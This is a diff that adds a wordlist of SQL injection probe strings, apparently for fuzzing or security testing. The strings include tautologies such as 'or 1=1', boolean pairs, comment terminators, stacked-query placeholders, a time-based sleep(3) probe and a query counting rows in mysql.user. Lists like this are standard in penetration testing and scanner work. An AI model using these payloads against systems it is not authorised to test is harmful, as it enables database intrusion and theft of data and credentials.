@@ -1,0 +1,54 @@
+'
+or 1=1–+
+'or 1=1–+
+"or 1=1–+
+)or 1=1–+
+')or 1=1–+
+")or 1=1–+
+"))or 1=1–+
+'OR '1' = '1
+')OR ('1' = '1
+1'OR '1' = '2
+1')OR ('1' = '2
+'AND '1' = '2
+')AND ('1' = '2
+') and sleep(3)--+
+' OR 'ab' = 'a''b
+') OR ('ab' = 'a''b
+value + 1
+value - 1
+value + 0
+value - 0
+ OR 1 = 1
+) OR (1 = 1
+value OR 1 = 2
+value) OR (1 = 2
+AND 1 = 2
+) AND (1 = 2
+' OR 'ab' = 'a''b
+') OR ('ab' = 'a''b
+value';--
+value');--
+value';SQL语句;--
+value');SQL语句;--
+value;--
+value);--
+value';#
+value');#
+value;#
+value);#
+' OR '1' = '1';--
+') OR '1' = '1';--
+ OR 1 = 1;--
+) OR 1 = 1;--
+' AND '1' = '2';--
+') AND '1' = '2';--
+ AND 1 = 2;--
+) AND 1 = 2;--
+value');
+value;
+value);
+/*注入内容*/
+    ;select 1
+and (select count(*) from mysql.user)>0/*
+
